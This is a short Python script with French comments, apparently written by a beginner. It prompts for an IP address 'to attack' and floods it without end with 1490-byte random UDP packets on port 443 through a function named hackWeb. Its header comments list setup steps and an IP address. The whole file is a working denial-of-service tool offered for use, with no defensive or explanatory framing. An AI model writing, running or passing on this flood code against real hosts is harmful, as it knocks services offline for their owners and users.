# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""

 
# https://www.python.org/downloads/
# installer pip
# python get-pip.py
# installer le package socket 
# pip ou pip3 install socket 
# installer visual studio code 
# https://code.visualstudio.com/
# 213.186.33.3
# http://www.mon-ip.com/adresse-ip-site-internet.php
# ping monsite.com
# https://yogosha.com/fr/
# https://socket.io/






# import du module os executer des commandes python
import os
# import du module socket pour créer une requete via socket 
import socket
# import du module une chaine de caratère 
import random
# utiliser le module time 
import time

##############
site = input("Ip a attaquer : ")
site2 = input("Ip a attaquer : ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


def hackWeb(site, port):
        sock.sendto(bytes, (site,port))
        
sent = 0
port=443
while True:
    print(port)
    hackWeb(site,port)
    


        
# python3 main.py